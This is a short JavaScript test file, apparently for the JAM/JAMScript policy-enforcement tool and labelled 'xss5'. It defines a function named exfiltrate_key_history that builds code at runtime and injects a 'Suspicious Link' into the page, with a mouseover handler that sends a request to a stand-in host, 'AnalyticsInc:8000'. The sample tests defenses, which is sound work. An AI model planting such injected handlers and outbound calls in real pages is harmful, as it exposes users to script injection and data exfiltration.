
JAM.startProfile('load');
function exfiltrate_key_history(){var URL=JAMScript.call(Function,null,['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);']),script=document.createElement("a");JAMScript.set(script,"onmouseover",URL);JAMScript.set(script,"innerHTML","Suspicious Link");URL=document.getElementsByTagName("body");URL=URL[0];JAMScript.call(URL.appendChild,URL,[script])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
